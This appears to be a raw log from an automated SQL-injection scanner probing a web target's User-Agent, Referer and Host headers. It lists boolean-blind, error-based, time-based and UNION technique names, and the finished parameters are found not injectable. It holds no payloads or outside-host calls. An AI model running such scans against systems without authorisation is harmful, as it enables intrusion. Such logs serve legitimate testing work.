[05:08:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:08:52] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:08:53] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[05:08:53] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[05:08:54] [WARNING] GET parameter 'foo' does not seem to be injectable
[05:08:54] [INFO] testing if parameter 'User-Agent' is dynamic
[05:08:54] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[05:08:54] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[05:08:54] [INFO] testing for SQL injection on parameter 'User-Agent'
[05:08:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:08:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:08:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:08:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:08:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:08:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:08:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:08:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:08:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:08:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:08:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:08:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:08:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:08:56] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:08:57] [INFO] testing 'Generic inline queries'
[05:08:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:08:57] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:08:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:08:58] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:08:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:08:58] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:08:59] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:08:59] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:08:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:08:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:08:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:08:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:08:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:08:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:08:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:08:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:08:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:08:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:08:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:09:00] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:09:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:09:00] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:09:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:09:00] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:09:00] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:09:00] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:09:01] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:09:01] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:09:01] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:09:01] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:09:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:09:02] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:09:02] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:09:02] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:09:02] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:09:02] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:09:02] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:09:03] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:09:03] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:09:03] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:09:03] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:09:03] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:09:03] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:09:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:09:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:09:03] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:09:03] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:09:03] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:09:03] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:09:03] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:09:03] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:09:03] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:09:03] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:09:03] [INFO] testing 'MySQL inline queries'
[05:09:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:09:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:09:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:09:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:09:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:09:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:09:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:09:04] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:09:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[05:09:04] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[05:09:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[05:09:04] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[05:09:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[05:09:04] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[05:09:04] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[05:09:05] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[05:09:05] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[05:09:05] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[05:09:05] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[05:09:05] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[05:09:05] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[05:09:06] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[05:09:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[05:09:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[05:09:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[05:09:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[05:09:06] [INFO] testing 'MySQL AND time-based blind (ELT)'
[05:09:06] [INFO] testing 'MySQL OR time-based blind (ELT)'
[05:09:07] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[05:09:07] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[05:09:07] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:09:07] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:09:07] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[05:09:07] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[05:09:07] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[05:09:07] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[05:09:07] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[05:09:07] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[05:09:07] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[05:09:07] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[05:09:07] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
[05:09:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:09:07] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:09:08] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[05:09:08] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[05:09:08] [WARNING] parameter 'User-Agent' does not seem to be injectable
[05:09:08] [INFO] testing if parameter 'Referer' is dynamic
[05:09:08] [WARNING] parameter 'Referer' does not appear to be dynamic
[05:09:08] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[05:09:08] [INFO] testing for SQL injection on parameter 'Referer'
[05:09:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:09:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:09:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:09:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:09:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:09:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:09:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:09:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:09:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:09:11] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:09:11] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:09:11] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:09:11] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:09:11] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:09:11] [INFO] testing 'Generic inline queries'
[05:09:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:09:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:09:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:09:12] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:09:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:09:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:09:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:09:13] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:09:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:09:13] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:09:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:09:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:09:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:09:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:09:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:09:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:09:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:09:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:09:14] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:09:14] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:09:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:09:14] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:09:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:09:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:09:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:09:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:09:15] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:09:15] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:09:15] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:09:15] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:09:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:09:16] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:09:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:09:16] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:09:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:09:16] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:09:16] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:09:17] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:09:17] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:09:17] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:09:17] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:09:17] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:09:17] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:09:17] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:09:17] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:09:17] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:09:17] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:09:17] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:09:17] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:09:17] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:09:17] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:09:17] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:09:17] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:09:17] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:09:17] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:09:17] [INFO] testing 'MySQL inline queries'
[05:09:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:09:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:09:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:09:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:09:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:09:18] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:09:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:09:18] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:09:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[05:09:18] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[05:09:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[05:09:18] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[05:09:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[05:09:19] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[05:09:19] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[05:09:19] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[05:09:19] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[05:09:19] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[05:09:19] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[05:09:19] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[05:09:19] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[05:09:20] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[05:09:20] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[05:09:20] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[05:09:20] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[05:09:20] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[05:09:20] [INFO] testing 'MySQL AND time-based blind (ELT)'
[05:09:20] [INFO] testing 'MySQL OR time-based blind (ELT)'
[05:09:21] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[05:09:21] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[05:09:21] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:09:21] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:09:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[05:09:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[05:09:21] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[05:09:21] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[05:09:21] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[05:09:21] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[05:09:21] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[05:09:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[05:09:21] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
[05:09:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:09:21] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:09:22] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[05:09:22] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[05:09:22] [WARNING] parameter 'Referer' does not seem to be injectable
[05:09:22] [INFO] testing if parameter 'Host' is dynamic
[05:09:22] [WARNING] parameter 'Host' does not appear to be dynamic
[05:09:22] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[05:09:22] [INFO] testing for SQL injection on parameter 'Host'
[05:09:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:09:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:09:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:09:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:09:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:09:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:09:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:09:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:09:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:09:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:09:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:09:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:09:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:09:24] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:09:24] [INFO] testing 'Generic inline queries'
[05:09:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:09:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:09:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:09:24] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:09:24] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:09:25] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:09:25] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:09:25] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:09:25] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:09:26] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:09:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:09:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:09:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:09:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:09:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:09:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:09:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:09:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:09:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:09:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:09:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:09:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:09:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:09:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:09:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:09:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:09:27] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:09:27] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:09:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:09:27] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:09:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:09:27] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:09:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:09:28] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:09:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:09:28] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
